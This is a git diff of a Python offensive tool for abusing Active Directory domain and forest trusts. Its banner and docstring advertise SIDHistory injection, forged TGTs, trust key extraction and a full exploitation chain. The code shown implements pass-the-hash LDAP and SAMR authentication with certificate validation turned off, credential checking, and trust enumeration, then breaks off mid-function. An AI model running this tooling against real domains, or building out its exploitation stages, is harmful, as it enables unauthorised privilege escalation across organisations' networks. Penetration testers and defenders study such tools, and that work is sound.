@@ -1,24 +1,36 @@
 #!/usr/bin/env python3
+"""
+    ╔═══════════════════════════════════════════════════════════╗
+    ║           Cross Domain / Forest Trust Abuse             ║
+    ║  Enumerate | Decode | Exploit Cross-Forest & Intra-     ║
+    ║  Forest Trusts via LDAP, RPC/SAMR, and Kerberos         ║
+    ╚═══════════════════════════════════════════════════════════╝
+"""
 
-
-import argparse
 import sys
+import re
+import ssl
 import os
-import logging
 import socket
+import struct
 import signal
-import time
+import logging
+import hashlib
+import argparse
 import ipaddress
-import getpass
 import ctypes
+import getpass
+import random
+import string
+import time
 from datetime import datetime
-from typing import Dict, List, Optional, Any
-from binascii import hexlify
+from typing import Dict, List, Optional, Any, Tuple
+from binascii import hexlify, unhexlify
 
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
 # MD4 FIX: Enable legacy OpenSSL providers for NTLM authentication
 # Modern systems (OpenSSL 3.x) disable MD4 by default, breaking ldap3 NTLM
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
 def _enable_md4():
     """Try to enable MD4 support for NTLM authentication."""
     try:
@@ -42,44 +54,191 @@ def _enable_md4():
 
 _MD4_ENABLED = _enable_md4()
 
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
+# COLORAMA INIT
+# =============================================================================
+try:
+    from colorama import Fore, Style, init
+    init(autoreset=True)
+    HAS_COLORAMA = True
+except ImportError:
+    HAS_COLORAMA = False
+    class _DummyFore:
+        def __getattr__(self, name):
+            return ''
+    class _DummyStyle:
+        def __getattr__(self, name):
+            return ''
+    Fore = _DummyFore()
+    Style = _DummyStyle()
+
+logging.getLogger().setLevel(logging.ERROR)
+
+# =============================================================================
 # GLOBALS & INTERRUPT HANDLING
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
 INTERRUPTED = False
 
 def signal_handler(sig, frame):
     global INTERRUPTED
     INTERRUPTED = True
-    print("\n[!] Interrupted by user (Ctrl+C). Exiting gracefully...")
+    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
 
-# ─────────────────────────────────────────────────────────────────────────────
-# COLORS
-# ─────────────────────────────────────────────────────────────────────────────
-R  = "\033[91m"
-G  = "\033[92m"
-Y  = "\033[93m"
-B  = "\033[94m"
-C  = "\033[96m"
-W  = "\033[97m"
-M  = "\033[95m"
-BO = "\033[1m"
-RS = "\033[0m"
+# =============================================================================
+# BANNER
+# =============================================================================
+def banner():
+    print(Fore.CYAN + """
+    ╔═══════════════════════════════════════════════════════════╗
+    ║           Cross Domain / Forest Trust Abuse               ║
+    ║  Enumerate | Decode | Exploit Cross-Forest & Intra-       ║
+    ║  Forest Trusts via LDAP, RPC/SAMR, and Kerberos           ║
+    ╚═══════════════════════════════════════════════════════════╝
+    """ + Style.RESET_ALL)
 
-# ─────────────────────────────────────────────────────────────────────────────
-# UTILITY: VALIDATE IP / DOMAIN / CONNECTIVITY
-# ─────────────────────────────────────────────────────────────────────────────
-def validate_ip(ip_str):
-    """Validate IP address format."""
+# =============================================================================
+# VALIDATORS (Same style as ForceChangePassword template)
+# =============================================================================
+def validate_ip(ip):
+    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
+    if not re.match(pattern, ip):
+        return False
+    return all(0 <= int(p) <= 255 for p in ip.split('.'))
+
+
+def validate_domain(domain):
+    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
+    if not re.match(pattern, domain):
+        return False
+    for part in domain.split('.'):
+        if part.startswith('-') or part.endswith('-') or not part:
+            return False
+    return True
+
+
+def validate_hash(hash_str):
+    if ':' in hash_str:
+        parts = hash_str.split(':')
+        if len(parts) == 2:
+            lm, nt = parts
+            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
+        return False
+    else:
+        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)
+
+
+def validate_sid(sid_str):
+    """Validate Windows SID format (S-1-5-21-...)."""
+    pattern = r'^S-1-5(-\d+)+$'
+    return bool(re.match(pattern, sid_str))
+
+
+def validate_port(port_str):
     try:
-        ipaddress.ip_address(ip_str)
-        return True
+        p = int(port_str)
+        return 1 <= p <= 65535
     except ValueError:
         return False
 
-def check_host_reachable(ip, port=389, timeout=3):
+
+# =============================================================================
+# SAFE INPUT HANDLER (Ctrl+C safe, same style as template)
+# =============================================================================
+def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=None):
+    """Robust input handler with validation, defaults, and Ctrl+C safety."""
+    while True:
+        try:
+            display_prompt = prompt
+            if default is not None:
+                display_prompt = prompt.replace(': ', ' [%s]: ' % default)
+
+            value = input(display_prompt).strip()
+
+            if not value and default is not None:
+                value = default
+
+            if not value and not allow_empty:
+                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
+                continue
+
+            if validator and value and not validator(value):
+                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
+                continue
+
+            return value
+
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+            sys.exit(0)
+        except EOFError:
+            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
+            return None
+
+
+def get_password_input(prompt, validator=None, error_msg=None, default=None):
+    """Secure password input with getpass."""
+    while True:
+        try:
+            display_prompt = prompt
+            if default is not None:
+                display_prompt = prompt.replace(': ', ' [%s]: ' % default)
+
+            value = getpass.getpass(display_prompt).strip()
+
+            if not value and default is not None:
+                value = default
+
+            if not value:
+                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
+                continue
+
+            if validator and value and not validator(value):
+                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
+                continue
+
+            return value
+
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+            sys.exit(0)
+        except EOFError:
+            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
+            return None
+
+
+# =============================================================================
+# UTILITY FUNCTIONS
+# =============================================================================
+def get_base_dn(domain):
+    """Convert domain FQDN to LDAP base DN."""
+    return ','.join(["DC=%s" % part for part in domain.split('.')])
+
+
+def sid_to_string(raw_sid):
+    """Convert raw binary SID to string representation."""
+    if not raw_sid or len(raw_sid) < 8:
+        return ""
+    try:
+        revision = raw_sid[0]
+        sub_authority_count = raw_sid[1]
+        identifier_authority = int.from_bytes(raw_sid[2:8], 'big')
+        sid_str = "S-%d-%d" % (revision, identifier_authority)
+        offset = 8
+        for i in range(sub_authority_count):
+            if offset + 4 > len(raw_sid):
+                break
+            sub_auth = int.from_bytes(raw_sid[offset:offset+4], 'little')
+            sid_str += "-%d" % sub_auth
+            offset += 4
+        return sid_str
+    except Exception:
+        return str(raw_sid)
+
+
+def check_ip_reachable(ip, port=389, timeout=3):
     """Check if host is reachable on a given port."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -90,389 +249,382 @@ def check_host_reachable(ip, port=389, timeout=3):
     except Exception:
         return False
 
-def resolve_domain(dc_ip, domain):
-    """Try to resolve the domain via DNS."""
-    try:
-        socket.gethostbyname(domain)
-        return True
-    except socket.gaierror:
-        return False
 
-def validate_lab_config(dc_ip, domain):
-    """Comprehensive validation of lab configuration."""
-    errors = []
-    warnings = []
+def check_dc_ports(dc_ip):
+    """Check common AD ports on DC."""
+    ports = {
+        53: "DNS",
+        88: "Kerberos",
+        135: "RPC",
+        389: "LDAP",
+        445: "SMB",
+        636: "LDAPS",
+        3268: "Global Catalog"
+    }
+    open_ports = []
+    for port, name in ports.items():
+        if check_ip_reachable(dc_ip, port, timeout=2):
+            open_ports.append("%s(%d)" % (name, port))
+    return open_ports
 
-    if not validate_ip(dc_ip):
-        errors.append("Invalid IP address format: '%s'" % dc_ip)
-    else:
-        ports_to_check = {
-            389: "LDAP",
-            636: "LDAPS",
-            445: "SMB",
-            88: "Kerberos",
-            53: "DNS"
-        }
-        open_ports = []
-        for port, name in ports_to_check.items():
-            if check_host_reachable(dc_ip, port, timeout=2):
-                open_ports.append("%s (%d)" % (name, port))
 
-        if not open_ports:
-            warnings.append("No common AD ports open on %s. Is this the correct DC IP?" % dc_ip)
-        else:
-            print("  %s[+] Reachable ports: %s%s" % (G, ", ".join(open_ports), RS))
+def generate_random_password(length=16):
+    """Generate a strong random password."""
+    chars = string.ascii_letters + string.digits + "!@#$%^&*"
+    return ''.join(random.choice(chars) for _ in range(length))
 
-    if not domain or "." not in domain:
-        errors.append("Invalid domain format: '%s' (expected FQDN like domain.com)" % domain)
 
-    if not resolve_domain(dc_ip, domain):
-        warnings.append("Cannot resolve domain '%s'. DNS may be misconfigured or domain is wrong." % domain)
-
-    if errors:
-        print("\n%s%s[✗] CRITICAL ERRORS:%s" % (R, BO, RS))
-        for err in errors:
-            print("  %s  • %s%s" % (R, err, RS))
-
-    if warnings:
-        print("\n%s%s[!] WARNINGS:%s" % (Y, BO, RS))
-        for warn in warnings:
-            print("  %s  • %s%s" % (Y, warn, RS))
-
-    if errors:
-        print("\n%s[!] Please fix the errors above and try again.%s" % (R, RS))
-        return False
-
-    if warnings:
-        print("\n%s[?] Warnings detected. Continue anyway? (y/N): %s" % (Y, RS), end="")
-        try:
-            choice = input().strip().lower()
-            if choice not in ("y", "yes"):
-                print("%s[~] Aborted by user.%s" % (Y, RS))
-                return False
-        except (EOFError, KeyboardInterrupt):
-            print("\n%s[~] Aborted.%s" % (Y, RS))
-            return False
-
-    return True
-
-# ─────────────────────────────────────────────────────────────────────────────
-# SAFE INPUT HANDLER (Ctrl+C safe)
-# ─────────────────────────────────────────────────────────────────────────────
-def safe_input(prompt, default=""):
-    """Input that handles Ctrl+C gracefully."""
-    try:
-        return input(prompt).strip()
-    except (EOFError, KeyboardInterrupt):
-        print("\n%s[!] Input interrupted. Returning to menu...%s" % (Y, RS))
-        return None
-
-def safe_getpass(prompt):
-    """getpass that handles Ctrl+C gracefully."""
-    try:
-        return getpass.getpass(prompt)
-    except (EOFError, KeyboardInterrupt):
-        print("\n%s[!] Input interrupted. Returning to menu...%s" % (Y, RS))
-        return None
-
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
 # LDAP3 IMPORT (with graceful fallback)
-# ─────────────────────────────────────────────────────────────────────────────
+# =============================================================================
 try:
-    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, LEVEL
+    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, SUBTREE, LEVEL, BASE, Tls
     from ldap3.core.exceptions import LDAPException, LDAPSocketOpenError, LDAPBindError
     LDAP3_AVAILABLE = True
 except ImportError:
-    print("%s[!] ldap3 library not found. Install with: pip install ldap3%s" % (Y, RS))
+    print(Fore.YELLOW + "[!] ldap3 library not found. Install with: pip install ldap3" + Style.RESET_ALL)
     LDAP3_AVAILABLE = False
+    sys.exit(1)
 
-# Check MD4 availability and warn
-import hashlib
+# Check MD4 availability
 try:
     hashlib.new("md4", b"test")
     MD4_AVAILABLE = True
 except ValueError:
     MD4_AVAILABLE = False
-    print("%s[!] Warning: MD4 hash not available. NTLM auth may fail.%s" % (Y, RS))
-    print("%s    Fix: pip install pycryptodome  OR  enable OpenSSL legacy provider%s" % (Y, RS))
-
-# ─────────────────────────────────────────────────────────────────────────────
-# INTERACTIVE CONFIG
-# ─────────────────────────────────────────────────────────────────────────────
-def get_config():
-    print("\n%s%s╔════════════════════════════════════════════════════════╗" % (M, BO))
-    print("║                 A D   T R U S T   A B U S E                  ║")
-    print("║           Enumerate | Decode | Simulate | Exploit            ║")
-    print("╚══════════════════════════════════════════════════════════════╝%s" % RS)
-
-    print("\n%s%s[ Lab Configuration ]%s" % (C, BO, RS))
-    print("  %sPress Enter to use default value shown in [ ]%s\n" % (Y, RS))
-
-    dc_ip = safe_input("  %sDC IP      %s[192.168.x.x]%s: %s" % (W, C, W, RS))
-    if dc_ip is None:
-        return None, None
-    if not dc_ip:
-        dc_ip = "192.168.x.x"
-
-    domain = safe_input("  %sDomain     %s[domain.com]%s:       %s" % (W, C, W, RS))
-    if domain is None:
-        return None, None
-    if not domain:
-        domain = "domain.com"
-
-    print("\n%s[*] Validating lab configuration...%s" % (B, RS))
-    if not validate_lab_config(dc_ip, domain):
-        return None, None
-
-    print("\n  %s[+] Using: %s | %s%s\n" % (G, dc_ip, domain, RS))
-    return dc_ip, domain
+    print(Fore.YELLOW + "[!] Warning: MD4 hash not available. NTLM auth may fail." + Style.RESET_ALL)
+    print(Fore.YELLOW + "    Fix: pip install pycryptodome OR enable OpenSSL legacy provider" + Style.RESET_ALL)
 
 
-def get_creds():
-    print("\n%s%s[ Credentials ]%s" % (C, BO, RS))
-
-    username = safe_input("  %sUsername %s[Administrator]%s: %s" % (W, C, W, RS))
-    if username is None:
-        return None, None, None
-    if not username:
-        username = "Administrator"
-
-    print("\n  %sAuth method:%s" % (W, RS))
-    print("    %s[1]%s Password%s" % (C, W, RS))
-    print("    %s[2]%s NT Hash%s" % (C, W, RS))
-    ch = safe_input("\n  Choice %s[1]%s: %s" % (C, W, RS))
-    if ch is None:
-        return None, None, None
-    ch = ch or "1"
-
-    password = ""
-    nt_hash = ""
-
-    if ch == "2":
-        nt_hash = safe_input("  %sNT Hash: %s" % (W, RS))
-        if nt_hash is None:
-            return None, None, None
-    else:
-        password = safe_getpass("  %sPassword: %s" % (W, RS))
-        if password is None:
-            return None, None, None
-
-    return username, password, nt_hash
+# =============================================================================
+# IMPACKET IMPORT (with graceful fallback)
+# =============================================================================
+try:
+    from impacket.dcerpc.v5 import transport, samr, lsad, lsat, rpcrt
+    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED, NULL, RPC_UNICODE_STRING
+    from impacket.dcerpc.v5.samr import USER_INFORMATION_CLASS
+    from impacket.krb5.ccache import CCache
+    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+    from impacket.krb5.types import Principal, KerberosTime, Ticket
+    from impacket.krb5 import constants
+    from impacket.krb5.crypto import Key, _enctype_table
+    from impacket.ntlm import compute_nthash
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    print(Fore.YELLOW + "[!] impacket library not found. Some features will be limited." + Style.RESET_ALL)
+    print(Fore.YELLOW + "    Install with: pip install impacket" + Style.RESET_ALL)
+    IMPACKET_AVAILABLE = False
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# MENU
-# ─────────────────────────────────────────────────────────────────────────────
-def show_menu():
-    print("\n  %s┌─────────────────────────────────────────────────────────────┐" % C)
-    print("  │              SELECT TRUST ABUSE TECHNIQUE                   │")
-    print("  ├─────────────────────────────────────────────────────────────┤")
-    print("  │  %s[1] enumerate  — Enumerate all domain trusts via LDAP   %s  │" % (W, C))
-    print("  │  %s[2] decode     — Decode trust flags & attributes        %s  │" % (W, C))
-    print("  │  %s[3] simulate   — Simulate abuse paths (dry-run)         %s  │" % (W, C))
-    print("  │  %s[4] intraforest— Intra-forest trust abuse (SIDHistory)    %s  │" % (W, C))
-    print("  │  %s[5] crossforest— Cross-forest trust abuse (TGT forge)     %s  │" % (W, C))
-    print("  │  %s[6] sidfilter  — Check SID filtering status              %s  │" % (W, C))
-    print("  │  %s[7] trustkeys  — Extract trust keys (requires DA)         %s  │" % (W, C))
-    print("  │  %s[8] exploit    — Full exploitation chain (DANGEROUS)     %s  │" % (W, C))
-    print("  │  %s[0] exit                                                    %s  │" % (W, C))
-    print("  └─────────────────────────────────────────────────────────────┘%s" % RS)
-    return safe_input("\n  %s❯ %s" % (W, RS))
+# #############################################################################
+# TRUST ABUSE ENGINE -- Core Class
+# #############################################################################
+class TrustAbuseEngine:
+    """
+    Cross Domain / Forest Trust Abuse Engine
 
+    Supports:
+    - CrossForestTrust exploitation
+    - SameForestTrust (Intra-forest) exploitation  
+    - TrustKeys extraction and abuse
+    - SIDHistory injection
+    - TGT forging (ExtraSIDs)
+    """
 
-# ════════════════════════════════════════════════════════════════════════════
-# TRUST ABUSE SCRIPT CLASS
-# ════════════════════════════════════════════════════════════════════════════
-class TrustAbuseScript:
-    def __init__(self, dc_ip, domain, username, password, nt_hash):
+    def __init__(self, dc_ip, domain, username, password, auth_type='password',
+                 lmhash='', nthash='', ticket_file=''):
         self.dc_ip = dc_ip
-        self.domain = domain
+        self.domain = domain.upper()
         self.username = username
         self.password = password
-        self.nt_hash = nt_hash
+        self.auth_type = auth_type
+        self.lmhash = lmhash
+        self.nthash = nthash
+        self.ticket_file = ticket_file
         self.conn = None
         self.trusts = []
+        self.domain_sid = None
+        self.base_dn = get_base_dn(domain)
         self.logger = self._setup_logger()
 
     def _setup_logger(self):
+        """Setup file logging."""
         logger = logging.getLogger("trust_abuse")
         logger.setLevel(logging.DEBUG)
 
         if not logger.handlers:
             fh = logging.FileHandler("trust_abuse.log")
             fh.setLevel(logging.DEBUG)
-            ch = logging.StreamHandler(sys.stdout)
-            ch.setLevel(logging.INFO)
             formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
             fh.setFormatter(formatter)
-            ch.setFormatter(formatter)
             logger.addHandler(fh)
-            logger.addHandler(ch)
 
         return logger
 
-    def connect_ldap(self) -> bool:
-        """Establish LDAP connection with comprehensive error handling."""
-        if not LDAP3_AVAILABLE:
-            print("%s[!] ldap3 library not available.%s" % (R, RS))
-            return False
-
-        print("\n  %s[*] Connecting to LDAP server %s...%s" % (B, self.dc_ip, RS))
-
-        try:
-            server = Server(
-                self.dc_ip,
-                get_info=ALL,
-                use_ssl=False,
-                connect_timeout=10
-            )
-
-            user = "%s\\%s" % (self.domain, self.username)
-
-            self.conn = Connection(
-                server,
-                user=user,
-                password=self.password if self.password else self.nt_hash,
-                authentication=NTLM,
-                auto_bind=True,
-                read_only=True
-            )
-
-            print("  %s[+] Successfully bound to %s as %s%s" % (G, self.dc_ip, user, RS))
-            self.logger.info("[+] LDAP bind successful: %s@%s" % (user, self.dc_ip))
+    # -------------------------------------------------------------------------
+    # LDAP CONNECTION
+    # -------------------------------------------------------------------------
+    def connect_ldap(self, force=False):
+        """Establish LDAP/LDAPS connection with comprehensive error handling."""
+        if self.conn and not force:
             return True
 
+        print(Fore.YELLOW + "[*] Connecting to LDAP server..." + Style.RESET_ALL)
+
+        # Try LDAPS first
+        try:
+            tls = Tls(validate=ssl.CERT_NONE)
+            server = Server(self.dc_ip, port=636, use_ssl=True, tls=tls, 
+                          get_info=ALL, connect_timeout=10)
+
+            if self.auth_type == 'password':
+                self.conn = Connection(
+                    server,
+                    user="%s\\%s" % (self.domain, self.username),
+                    password=self.password,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+            elif self.auth_type == 'hash':
+                self.conn = Connection(
+                    server,
+                    user="%s\\%s" % (self.domain, self.username),
+                    password=self.lmhash + ':' + self.nthash,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+            else:
+                # Kerberos - try simple bind with ticket
+                self.conn = Connection(
+                    server,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+
+            print(Fore.GREEN + "[+] Connected via LDAPS (port 636)" + Style.RESET_ALL)
+            self.logger.info("[+] LDAPS connection established to %s", self.dc_ip)
+            return True
+
+        except Exception as e:
+            pass
+
+        # Fallback to LDAP
+        try:
+            server = Server(self.dc_ip, get_info=ALL, connect_timeout=10)
+
+            if self.auth_type == 'password':
+                self.conn = Connection(
+                    server,
+                    user="%s\\%s" % (self.domain, self.username),
+                    password=self.password,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+            elif self.auth_type == 'hash':
+                self.conn = Connection(
+                    server,
+                    user="%s\\%s" % (self.domain, self.username),
+                    password=self.lmhash + ':' + self.nthash,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+            else:
+                self.conn = Connection(
+                    server,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+
+            print(Fore.YELLOW + "[!] Connected via LDAP (port 389) - consider using LDAPS" + Style.RESET_ALL)
+            self.logger.info("[+] LDAP connection established to %s", self.dc_ip)
+            return True
+
+        except LDAPBindError as e:
+            err = str(e).lower()
+            if "invalid credentials" in err:
+                print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
+            elif "stronger authentication required" in err:
+                print(Fore.RED + "[-] LDAP signing required. Try LDAPS or disable signing." + Style.RESET_ALL)
+            else:
+                print(Fore.RED + "[-] LDAP bind failed: %s" % e + Style.RESET_ALL)
+            self.logger.error("[-] LDAP bind failed: %s", e)
+            return False
+
         except LDAPSocketOpenError as e:
-            print("  %s[!] Connection failed: Cannot reach DC at %s%s" % (R, self.dc_ip, RS))
-            print("  %s    -> Check: Is the IP correct? Is the DC running? Firewall?%s" % (R, RS))
-            self.logger.error("[-] LDAP connection timeout: %s" % e)
+            print(Fore.RED + "[-] Cannot connect to DC at %s" % self.dc_ip + Style.RESET_ALL)
+            print(Fore.RED + "    -> Check: Is the IP correct? Is the DC running? Firewall?" + Style.RESET_ALL)
+            self.logger.error("[-] LDAP connection failed: %s", e)
             return False
 
         except ValueError as e:
             err_str = str(e).lower()
             if "md4" in err_str:
-                print("  %s[!] MD4 hash algorithm not available%s" % (R, RS))
-                print("  %s    This is a known issue on modern systems (OpenSSL 3.x)%s" % (R, RS))
-                print("\n  %s[FIX] Try one of these solutions:%s" % (Y, RS))
-                print("  %s  1. Install pycryptodome:%s" % (C, RS))
-                print("  %s     pip install pycryptodome%s" % (W, RS))
-                print("  %s  2. Enable legacy OpenSSL providers:%s" % (C, RS))
-                print("  %s     Edit /etc/ssl/openssl.cnf and add legacy provider%s" % (W, RS))
-                print("  %s  3. Use Kerberos auth instead of NTLM (if available)%s" % (C, RS))
-                print("  %s     # Requires valid Kerberos ticket (kinit)%s" % (W, RS))
-                print("\n  %s[!] The script attempted to auto-enable MD4 but failed.%s" % (Y, RS))
+                print(Fore.RED + "[-] MD4 hash algorithm not available (OpenSSL 3.x issue)" + Style.RESET_ALL)
+                print(Fore.YELLOW + "    [FIX] pip install pycryptodome" + Style.RESET_ALL)
+                print(Fore.YELLOW + "    [FIX] Enable OpenSSL legacy provider" + Style.RESET_ALL)
             else:
-                print("  %s[!] Value error: %s%s" % (R, e, RS))
-            self.logger.error("[-] LDAP ValueError: %s" % e)
-            return False
-
-        except LDAPBindError as e:
-            error_msg = str(e).lower()
-            if "invalid credentials" in error_msg:
-                print("  %s[!] Bind failed: Invalid credentials%s" % (R, RS))
-                print("  %s    -> Check: Wrong password, or user does not exist in domain '%s'%s" % (R, self.domain, RS))
-            elif "stronger authentication required" in error_msg:
-                print("  %s[!] Bind failed: LDAP signing required%s" % (R, RS))
-                print("  %s    -> Try: Use LDAPS (port 636) or disable signing%s" % (R, RS))
-            else:
-                print("  %s[!] Bind failed: %s%s" % (R, e, RS))
-            self.logger.error("[-] LDAP bind failed: %s" % e)
+                print(Fore.RED + "[-] Value error: %s" % e + Style.RESET_ALL)
+            self.logger.error("[-] LDAP ValueError: %s", e)
             return False
 
         except Exception as e:
-            print("  %s[!] Unexpected LDAP error: %s%s" % (R, e, RS))
-            self.logger.error("[-] Unexpected LDAP error: %s" % e)
+            print(Fore.RED + "[-] Unexpected LDAP error: %s" % e + Style.RESET_ALL)
+            self.logger.error("[-] Unexpected LDAP error: %s", e)
             return False
 
-    def enumerate_trusts(self) -> List[Dict]:
-        """Enumerate trustedDomain objects from AD."""
+    # -------------------------------------------------------------------------
+    # CREDENTIALS VERIFICATION
+    # -------------------------------------------------------------------------
+    def verify_credentials(self):
+        """Verify credentials and domain via LDAP or RPC."""
+        print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
+
+        if self.auth_type == 'password':
+            if self.connect_ldap():
+                try:
+                    self.conn.search(
+                        search_base=self.base_dn,
+                        search_filter='(objectClass=domain)',
+                        search_scope=SUBTREE,
+                        attributes=['dc']
+                    )
+                    if len(self.conn.entries) > 0:
+                        print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
+                        print(Fore.GREEN + "[+] Domain '%s' verified!" % self.domain + Style.RESET_ALL)
+                        return True
+                except Exception:
+                    pass
+
+        # Fallback to RPC verification
+        if IMPACKET_AVAILABLE:
+            try:
+                string_binding = 'ncacn_np:%s[\\pipe\\samr]' % self.dc_ip
+                tr = transport.DCERPCTransportFactory(string_binding)
+
+                if self.auth_type == 'hash':
+                    tr.set_credentials(self.username, '', self.domain, self.lmhash, self.nthash)
+                elif self.auth_type == 'ticket':
+                    tr.set_credentials(self.username, '', self.domain, '', '')
+                    tr.set_kerberos(True, kdcHost=self.dc_ip)
+                    if self.ticket_file and os.path.exists(self.ticket_file):
+                        os.environ['KRB5CCNAME'] = self.ticket_file
+                else:
+                    tr.set_credentials(self.username, self.password, self.domain, '', '')
+
+                dce = tr.get_dce_rpc()
+                dce.connect()
+                dce.bind(samr.MSRPC_UUID_SAMR)
+
+                resp = samr.hSamrConnect(dce)
+                server_hd = resp['ServerHandle']
+
+                resp = samr.hSamrLookupDomainInSamServer(
+                    dce, server_hd, self.domain.split('.')[0]
+                )
+
+                samr.hSamrCloseHandle(dce, server_hd)
+                dce.disconnect()
+
+                print(Fore.GREEN + "[+] Credentials verified via RPC!" + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] Domain '%s' verified!" % self.domain + Style.RESET_ALL)
+                return True
+
+            except Exception as e:
+                err = str(e).lower()
+                if any(x in err for x in ['logon failure', 'access_denied', 
+                    'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
+                    print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
+                    return "invalid_credentials"
+                print(Fore.RED + "[-] RPC verification failed: %s" % e + Style.RESET_ALL)
+
+        print(Fore.RED + "[-] Domain '%s' not found or unreachable!" % self.domain + Style.RESET_ALL)
+        return False
+
+    # -------------------------------------------------------------------------
+    # TRUST ENUMERATION
+    # -------------------------------------------------------------------------
+    def enumerate_trusts(self):
+        """Enumerate all domain trusts via LDAP."""
         if not self.conn:
-            print("%s[!] No LDAP connection. Run connect first.%s" % (R, RS))
+            print(Fore.RED + "[!] No LDAP connection. Connect first." + Style.RESET_ALL)
             return []
 
-        print("\n  %s[*] Enumerating domain trusts...%s" % (B, RS))
+        print(Fore.YELLOW + "\n[*] Enumerating domain trusts..." + Style.RESET_ALL)
 
         try:
-            search_base = "DC=" + self.domain.replace(".", ",DC=")
-            filter_str = "(objectClass=trustedDomain)"
-
             self.conn.search(
-                search_base=search_base,
-                search_filter=filter_str,
+                search_base=self.base_dn,
+                search_filter='(objectClass=trustedDomain)',
                 search_scope=SUBTREE,
                 attributes=[
-                    "cn", "trustAttributes", "trustDirection", "trustType",
-                    "trustPartner", "flatName", "securityIdentifier",
-                    "trustAuthIncoming", "trustAuthOutgoing", "whenCreated",
-                    "whenChanged"
+                    'cn', 'trustAttributes', 'trustDirection', 'trustType',
+                    'trustPartner', 'flatName', 'securityIdentifier',
+                    'trustAuthIncoming', 'trustAuthOutgoing', 'whenCreated',
+                    'whenChanged'
                 ]
             )
 
-            trusts = []
+            self.trusts = []
             for entry in self.conn.entries:
                 trust_info = {
-                    "dn": str(entry.dn),
-                    "cn": str(entry.get("cn", "")),
-                    "trustPartner": str(entry.get("trustPartner", "")),
-                    "flatName": str(entry.get("flatName", "")),
-                    "trustType": self._decode_trust_type(entry.get("trustType")),
-                    "trustDirection": self._decode_trust_direction(entry.get("trustDirection")),
-                    "trustAttributes": self._decode_trust_attributes(entry.get("trustAttributes")),
-                    "sid": str(entry.get("securityIdentifier", "")),
-                    "whenCreated": str(entry.get("whenCreated", "")),
-                    "whenChanged": str(entry.get("whenChanged", ""))
+                    'dn': str(entry.dn),
+                    'cn': str(entry.get('cn', '')),
+                    'trustPartner': str(entry.get('trustPartner', '')),
+                    'flatName': str(entry.get('flatName', '')),
+                    'trustType': self._decode_trust_type(entry.get('trustType')),
+                    'trustDirection': self._decode_trust_direction(entry.get('trustDirection')),
+                    'trustAttributes': self._decode_trust_attributes(entry.get('trustAttributes')),
+                    'sid': str(entry.get('securityIdentifier', '')),
+                    'rawAttributes': str(entry.get('trustAttributes', '0')),
+                    'rawDirection': str(entry.get('trustDirection', '0')),
+                    'rawType': str(entry.get('trustType', '0')),
+                    'whenCreated': str(entry.get('whenCreated', '')),
+                    'whenChanged': str(entry.get('whenChanged', ''))
                 }
-                trusts.append(trust_info)
+                self.trusts.append(trust_info)
 
-                print("\n  %s%s[ Trust Found ]%s" % (G, BO, RS))
-                print("  %s  Partner:      %s%s%s" % (W, C, trust_info["trustPartner"], RS))
-                print("  %s  Flat Name:    %s%s%s" % (W, C, trust_info["flatName"], RS))
-                print("  %s  Type:         %s%s%s" % (W, Y, trust_info["trustType"], RS))
-                print("  %s  Direction:    %s%s%s" % (W, Y, trust_info["trustDirection"], RS))
-                print("  %s  Attributes:   %s%s%s" % (W, M, trust_info["trustAttributes"], RS))
-                print("  %s  SID:          %s%s%s" % (W, C, trust_info["sid"], RS))
-                print("  %s  Created:      %s%s" % (W, trust_info["whenCreated"]))
+                print(Fore.GREEN + "\n[+] Trust Found: %s" % trust_info['trustPartner'] + Style.RESET_ALL)
+                print("    Partner:    %s%s%s" % (Fore.CYAN, trust_info['trustPartner'], Style.RESET_ALL))
+                print("    Flat Name:  %s%s%s" % (Fore.CYAN, trust_info['flatName'], Style.RESET_ALL))
+                print("    Type:       %s%s%s" % (Fore.YELLOW, trust_info['trustType'], Style.RESET_ALL))
+                print("    Direction:  %s%s%s" % (Fore.YELLOW, trust_info['trustDirection'], Style.RESET_ALL))
